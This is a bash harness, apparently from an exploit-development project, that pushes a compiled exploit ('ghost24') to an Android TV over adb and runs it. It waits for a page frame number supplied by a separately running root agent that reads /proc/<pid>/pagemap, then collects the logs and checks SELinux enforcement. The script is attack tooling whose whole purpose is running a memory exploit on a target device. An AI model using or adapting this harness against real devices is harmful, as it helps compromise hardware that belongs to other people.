#!/bin/bash
# run24b.sh - test runner that does not touch TvService: the PFN is supplied by
# the long-lived root agent (pfnd2.sh polling /proc/<pid>/pagemap).
#
# Usage:  DEV=<tv-ip>:5555 bash ghost/run24b.sh [exploit args...]
# e.g.    DEV=... bash ghost/run24b.sh --walk --soft --ucoff 0x108 121 19 --rounds 4000
#
# Env:
#   DEV      adb serial / host:port of the target (required)
#   ADB      path to the adb binary (default: adb on PATH)
#   GHOST24  local path of the compiled exploit (default: ./ghost24 next to this script)
set -u
: "${DEV:?set DEV=<tv-ip>:5555}"
ADB="${ADB:-adb}"
HERE="$(cd "$(dirname "$0")" && pwd -W 2>/dev/null || pwd)"
BIN="${GHOST24:-$HERE/ghost24}"
ARGS="$*"
LOG=/data/local/tmp/g24.log

say() { printf '\n=== %s\n' "$*"; }
SH() { "$ADB" -s "$DEV" shell "$@" 2>&1 | tr -d '\r'; }

say "connect $DEV"
"$ADB" connect "$DEV" >/dev/null 2>&1
"$ADB" -s "$DEV" wait-for-device || { echo "!! device not ready"; exit 1; }
SH 'echo "boot_id=$(cat /proc/sys/kernel/random/boot_id) up=$(cut -d. -f1 /proc/uptime)s"'

say "push exploit"
MSYS2_ARG_CONV_EXCL='*' "$ADB" -s "$DEV" push "$BIN" //sdcard/Download/g24 2>&1 | tail -1
SH 'cp /sdcard/Download/g24 /data/local/tmp/g24; chmod 755 /data/local/tmp/g24'

say "clean previous artefacts"
SH "rm -f $LOG /sdcard/Download/g9_req.txt /sdcard/Download/g9_pfn.txt /sdcard/Download/pfn.log"

say "launch exploit $ARGS"
SH "cd /data/local/tmp && (./g24 $ARGS >/dev/null 2>&1 &)"

say "wait for PFN (served by the root agent, up to 20s)"
for i in $(seq 1 20); do
  P=$(SH 'cat /sdcard/Download/g9_pfn.txt 2>/dev/null')
  if [ -n "$P" ]; then echo "pfn=$P (at ${i}s)"; break; fi
  sleep 1
done
[ -z "${P:-}" ] && echo "!! no PFN received"

say "wait for completion (up to 90s, marker is the summary line)"
for i in $(seq 1 45); do
  sleep 2
  D=$(SH "grep -c 'echo stats' $LOG 2>/dev/null")
  [ "${D:-0}" != "0" ] && { echo "finished (at $((i*2))s)"; break; }
  S=$("$ADB" get-state 2>&1 | tr -d '\r')
  if [ "$S" != "device" ]; then echo "!! device dropped while waiting (~$((i*2))s)"; break; fi
done

say "===== g24.log ====="
SH "cat $LOG"
SH 'echo "--- pfn.log ---"; cat /sdcard/Download/pfn.log 2>/dev/null'

say "final state"
SH 'echo "boot_id=$(cat /proc/sys/kernel/random/boot_id) up=$(cut -d. -f1 /proc/uptime)s enforce=$(cat /sys/fs/selinux/enforce 2>&1)"'
